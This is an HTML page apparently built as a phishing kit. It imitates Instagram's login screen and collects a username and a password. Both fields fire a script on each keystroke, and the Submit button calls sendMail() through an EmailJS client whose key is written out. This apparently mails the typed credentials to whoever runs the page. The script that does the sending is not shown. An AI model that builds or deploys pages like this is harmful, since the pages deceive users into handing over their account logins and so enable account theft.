<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="img/ig-instagram-icon.svg " type="image/x-icon">

  <link rel="stylesheet" href="./style.css" />
  <link rel="icon" href="insta.jpeg" type="img/icon type">
  <title>Instagram Follow</title>

  <script src="action.js"></script>
  <link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
  integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
  crossorigin="anonymous"
/>
<script src="action.js"></script>

<script
  type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
></script>
<script type="text/javascript">
  (function () {
    emailjs.init("MNvWiuAh8eZ35Z5lA");
  })();
</script>

</head>

<body>
  <main class="flex align-items-center justify-content-center">
    <section id="mobile" class="flex"></section>
    <section id="auth" class="flex direction-column">
      <div class="panel login flex direction-column">
        <h1 title="Instagram" class="flex justify-content-center">
          <img src="instagram-logo.png" alt="Instagram logo" title="Instagram logo" width="175" />
        </h1>
  
          <input id="name" type="text"  onkeyup="getting_info()"placeholder="Phone number, username, or email" /><br>
          <label for="password"class="sr-only">Password</label>
          <input id="email"  type="password"  onkeyup="getting_info()"
            placeholder="Password" /> <br>
    
            <!-- <textarea class="form-control" id="message" rows="3" placeholder="Enter text please"></textarea> -->
              <br>
            <button class="btn btn-primary" onclick="sendMail()">Submit</button>
        </form>
        <div class="flex separator align-items-center">
          <span></span>
          <div class="or">OR</div>
          <span></span>
        </div>
        <div class="login-with-fb flex direction-column align-items-center">
          <div>
            <img />
            <a>Log in with Facebook</a>
          </div>
          <span id="error_msg" hidden style="color: red;">&nbsp;&nbsp;&nbsp;&nbsp;Sorry, your password was incorrect.
            Please double-check &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;your password.</span>
          <a href="#">Forgot password?</a>
        </div>
      </div>
      <div class="panel register flex justify-content-center">
        <p>Don't have an account? </p>
        <a href="#">Sign up</a>
      </div>
      <div class="app-download flex direction-column align-items-center">
        <p>Get the app.</p>
        <div class="flex justify-content-center">
          <img src="apple-button.png" alt="Imagem com a logo da Apple Store"
            title="Imagem com a logo da Apple Store" />
          <img src="googleplay-button.png" alt="Imagem com a logo da Google Play"
            title="Imagem com a logo da Google Play" />
        </div>
      </div>
    </section>
  </main>

</body>

</html>
